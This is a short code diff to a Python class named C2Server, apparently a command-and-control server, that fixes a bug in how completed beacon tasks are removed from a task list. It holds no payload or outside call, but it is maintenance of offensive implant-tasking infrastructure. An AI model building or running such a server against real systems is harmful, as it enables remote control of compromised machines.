@@ -499,6 +499,7 @@ class C2Server:
 
         # Process completed tasks
         if task_results:
+            tasks_to_remove = []
             for result in task_results:
                 task_id = result.get("task_id")
                 # Find and update task
@@ -508,8 +509,11 @@ class C2Server:
                         task["result"] = result.get("output")
                         task["completed_at"] = time.time()
                         beacon.completed_tasks.append(task)
-                        beacon.tasks.remove(task)
+                        tasks_to_remove.append(task)
                         break
+            # Remove after iteration to avoid modifying list during iteration
+            for task in tasks_to_remove:
+                beacon.tasks.remove(task)
 
         # Return pending tasks
         pending = [t for t in beacon.tasks if t["status"] == "pending"]
